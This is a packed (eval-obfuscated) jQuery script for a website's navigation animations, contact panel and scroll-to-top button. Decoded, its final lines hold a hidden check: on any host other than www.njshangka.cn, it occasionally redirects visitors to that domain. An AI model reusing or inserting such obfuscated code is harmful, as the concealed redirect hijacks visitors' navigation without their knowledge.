...
eval(function (p, a, c, k, e, d) {
    ...
    return p;
}('$(r).x(4(){$(".B").v(4(){$(6).3("u").a()},4(){$(6).3("u").9()});5 n=$(".d");d(n);n.3("e").v(4(){5 2=$(6).h().2+g;n.3(".c").t().f({2:2},C)},4(){5 2=n.3(".i").h().2+g;n.3(".c").t().f({2:2},7)});$("#8").a(A);$("#8 e").y(4(){$(6).3(\'.w\').a();$(6).z("l")});$("#8 e").D(4(){$(6).3(\'.w\').9();$(6).E("l")})});4 d(o){5 2=o.3(".i").h().2+g;5 b=o.3(".i").b();o.3(".c").R({2:2,b:b})}4 O(){$(".P").9(7)}4 S(){$(".8 .V").a(7);$(".8 .T").9(7)}4 U(){$(\'N,H\').f({Q:0},7)}5 j=F.s.j;5 m=G(L*M.J());K(m<=1&&j!==\'p.q.k\'){r.s=\'I://p.q.k\'};', 58, 58, '||left|find|function|var|this|300|right_contact|hide|show|width|nav_icon|nav|li|animate|40|position|on|host|cn|sel|ran|||www|njshangka|document|location|stop|img|hover|r_sub|ready|mouseover|addClass|500|ewm|400|mouseout|removeClass|window|parseInt|body|http|random|if|100|Math|html|close_contact_201601|right_contact_201601|scrollTop|css|show_contact|right_hide|gotop_201601|right_show'.split('|'), 0, {}))